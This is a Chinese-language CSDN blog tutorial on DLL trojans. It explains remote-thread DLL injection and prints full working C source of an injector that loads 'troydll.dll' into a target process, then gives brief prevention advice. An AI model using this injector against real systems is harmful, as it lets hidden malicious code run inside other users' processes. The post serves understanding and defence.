# VC++动态链接库编程之DLL木马 - 深之JohnChen的专栏 - CSDN博客

2006年03月24日 13:09:00[byxdaz](https://me.csdn.net/byxdaz)阅读数：2143标签：[dll																[vc++																[编程																[null																[windows																[api](https://so.csdn.net/so/search/s.do?q=api&t=blog)](https://so.csdn.net/so/search/s.do?q=windows&t=blog)](https://so.csdn.net/so/search/s.do?q=null&t=blog)](https://so.csdn.net/so/search/s.do?q=编程&t=blog)](https://so.csdn.net/so/search/s.do?q=vc++&t=blog)](https://so.csdn.net/so/search/s.do?q=dll&t=blog)
个人分类：[系统安全](https://blog.csdn.net/byxdaz/article/category/680600)


VC++动态链接库编程之DLL木马

来源: 天极网

DLL在程序编制中可作出巨大贡献，它提供了具共性代码的复用能力。但是，正如一门高深的武学，若被掌握在正义之侠的手上，便可助其仗义江湖；但若被掌握在邪恶之徒的手上，则必然在江湖上掀起腥风血雨。DLL正是一种这样的武学。DLL一旦染上了魔性，就不再是正常的DLL程序，而是DLL木马，一种恶贯满盈的病毒，令特洛伊一夜之间国破家亡。 

**DLL木马的原理**

DLL木马的实现原理是编程者在DLL中包含木马程序代码，随后在目标主机中选择特定目标进程，以某种方式强行指定该进程调用包含木马程序的DLL，最终达到侵袭目标系统的目的。

正是DLL程序自身的特点决定了以这种形式加载木马不仅可行，而且具有良好的隐藏性：

（1）DLL程序被映射到宿主进程的地址空间中，它能够共享宿主进程的资源，并根据宿主进程在目标主机的级别非法访问相应的系统资源；

（2）DLL程序没有独立的进程地址空间，从而可以避免在目标主机中留下"蛛丝马迹"，达到隐蔽自身的目的。

DLL木马实现了"真隐藏"，我们在任务管理器中看不到木马"进程"，它完全溶进了系统的内核。与"真隐藏"对应的是"假隐藏"，"假隐藏"木马把自己注册成为一个服务。虽然在任务管理器中也看不到这个进程，但是"假隐藏"木马本质上还具备独立的进程空间。"假隐藏"只适用于Windows9x的系统，对于基于WINNT的操作系统，通过服务管理器，我们可以发现系统中注册过的服务。

DLL木马注入其它进程的方法为远程线程插入。

远程线程插入技术指的是通过在另一个进程中创建远程线程的方法进入那个进程的内存地址空间。将木马程序以DLL的形式实现后，需要使用插入到目标进程中的远程线程将该木马DLL插入到目标进程的地址空间，即利用该线程通过调用Windows API LoadLibrary函数来加载木马DLL，从而实现木马对系统的侵害。

**DLL木马注入程序**

这里涉及到一个非常重要的Windows API――CreateRemoteThread。与之相比，我们所习惯使用的CreateThread API函数只能在进程自身内部产生一个新的线程，而且被创建的新线程与主线程共享地址空间和其他资源。而CreateRemoteThread则不同，它可以在另外的进程中产生线程！CreateRemoteThread有如下特点：

（1）CreateRemoteThread较CreateThread多一个参数hProcess，该参数用于指定要创建线程的远程进程，其函数原型为：

HANDLE CreateRemoteThread(

HANDLE hProcess, //远程进程句柄

LPSECURITY_ATTRIBUTES lpThreadAttributes,

SIZE_T dwStackSize,

LPTHREAD_START_ROUTINE lpStartAddress,

LPVOID lpParameter,

DWORD dwCreationFlags,

LPDWORD lpThreadId

);

（2）线程函数的代码不能位于我们用来注入DLL木马的进程所在的地址空间中。也就是说，我们不能想当然地自己写一个函数，并把这个函数作为远程线程的入口函数；

（3）不能把本进程的指针作为CreateRemoteThread的参数，因为本进程的内存空间与远程进程的不一样。

以下程序由作者Shotgun的DLL木马注入程序简化而得（[单击此处下载](http://cimg3.163.com/tech/yuandaima/1025_DLL.rar)，在经典书籍《Windows核心编程》中我们也可以看到类似的例子），它将d盘根目录下的troydll.dll插入到ID为4000的进程中：

#include <windows.h>

#include <stdlib.h>

#include <stdio.h>

void CheckError ( int, int, char *); //出错处理函数

PDWORD pdwThreadId; 

HANDLE hRemoteThread, hRemoteProcess;

DWORD fdwCreate, dwStackSize, dwRemoteProcessId;

PWSTR pszLibFileRemote=NULL;

void main(int argc,char **argv)

{

int iReturnCode;

char lpDllFullPathName[MAX_PATH];

WCHAR pszLibFileName[MAX_PATH]={0};

dwRemoteProcessId = 4000; 

strcpy(lpDllFullPathName, "d://troydll.dll");

//将DLL文件全路径的ANSI码转换成UNICODE码

iReturnCode = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS,

lpDllFullPathName, strlen(lpDllFullPathName),

pszLibFileName, MAX_PATH);

CheckError(iReturnCode, 0, "MultByteToWideChar");

//打开远程进程

hRemoteProcess = OpenProcess(PROCESS_CREATE_THREAD | //允许创建线程 

PROCESS_VM_OPERATION | //允许VM操作

PROCESS_VM_WRITE, //允许VM写

FALSE, dwRemoteProcessId ); 

CheckError( (int) hRemoteProcess, NULL, "Remote Process not Exist or Access Denied!");

//计算DLL路径名需要的内存空间

int cb = (1 + lstrlenW(pszLibFileName)) * sizeof(WCHAR);

pszLibFileRemote = (PWSTR) VirtualAllocEx( hRemoteProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);

CheckError((int)pszLibFileRemote, NULL, "VirtualAllocEx");

//将DLL的路径名复制到远程进程的内存空间

iReturnCode = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (PVOID) pszLibFileName, cb, NULL);

CheckError(iReturnCode, false, "WriteProcessMemory");

//计算LoadLibraryW的入口地址 

PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)

GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

CheckError((int)pfnStartAddr, NULL, "GetProcAddress");

//启动远程线程，通过远程线程调用用户的DLL文件 

hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);

CheckError((int)hRemoteThread, NULL, "Create Remote Thread");

//等待远程线程退出

WaitForSingleObject(hRemoteThread, INFINITE);

//清场处理

if (pszLibFileRemote != NULL)

{

VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);

}

if (hRemoteThread != NULL) 

{

CloseHandle(hRemoteThread );

}

if (hRemoteProcess!= NULL) 

{

CloseHandle(hRemoteProcess);

}

}

//错误处理函数CheckError()

void CheckError(int iReturnCode, int iErrorCode, char *pErrorMsg)

{

if(iReturnCode==iErrorCode)

{

printf("%s Error:%d/n/n", pErrorMsg, GetLastError());

//清场处理

if (pszLibFileRemote != NULL)

{

VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);

}

if (hRemoteThread != NULL) 

{

CloseHandle(hRemoteThread );

}

if (hRemoteProcess!= NULL)

{

CloseHandle(hRemoteProcess);

}

exit(0);

}

}

从DLL木马注入程序的源代码中我们可以分析出DLL木马注入的一般步骤为：

（1）取得宿主进程（即要注入木马的进程）的进程ID dwRemoteProcessId；

（2）取得DLL的完全路径，并将其转换为宽字符模式pszLibFileName；

（3）利用Windows API OpenProcess打开宿主进程，应该开启下列选项：

a.PROCESS_CREATE_THREAD：允许在宿主进程中创建线程；

b.PROCESS_VM_OPERATION：允许对宿主进程中进行VM操作；

c.PROCESS_VM_WRITE：允许对宿主进程进行VM写。

（4）利用Windows API VirtualAllocEx函数在远程线程的VM中分配DLL完整路径宽字符所需的存储空间，并利用Windows API WriteProcessMemory函数将完整路径写入该存储空间；

（5）利用Windows API GetProcAddress取得Kernel32模块中LoadLibraryW函数的地址，这个函数将作为随后将启动的远程线程的入口函数；

（6）利用Windows API CreateRemoteThread启动远程线程，将LoadLibraryW的地址作为远程线程的入口函数地址，将宿主进程里被分配空间中存储的完整DLL路径作为线程入口函数的参数以另其启动指定的DLL；

（7）清理现场。

**DLL木马的防治**

从DLL木马的原理和一个简单的DLL木马程序中我们学到了DLL木马的工作方式，这可以帮助我们更好地理解DLL木马病毒的防治手段。

一般的木马被植入后要打开一网络端口与攻击程序通信，所以防火墙是抵御木马攻击的最好方法。防火墙可以进行数据包过滤检查，我们可以让防火墙对通讯端口进行限制，只允许系统接受几个特定端口的数据请求。这样，即使木马植入成功，攻击者也无法进入到受侵系统，防火墙把攻击者和木马分隔开来了。 

对于DLL木马，一种简单的观察方法也许可以帮助用户发现之。我们查看运行进程所依赖的DLL，如果其中有一些莫名其妙的DLL，则可以断言这个进程是宿主进程，系统被植入了DLL木马。"道高一尺，魔高一丈"，现如今，DLL木马也发展到了更高的境界，它们看起来也不再"莫名其妙"。在最新的一些木马里面，开始采用了先进的DLL陷阱技术，编程者用特洛伊DLL替换已知的系统DLL。特洛伊DLL对所有的函数调用进行过滤，对于正常的调用，使用函数转发器直接转发给被替换的系统DLL；对于一些事先约定好的特殊情况，DLL会执行一些相应的操作。

本文给出的只是DLL木马最简单情况的介绍，读者若有兴趣深入研究，可以参考其它资料。


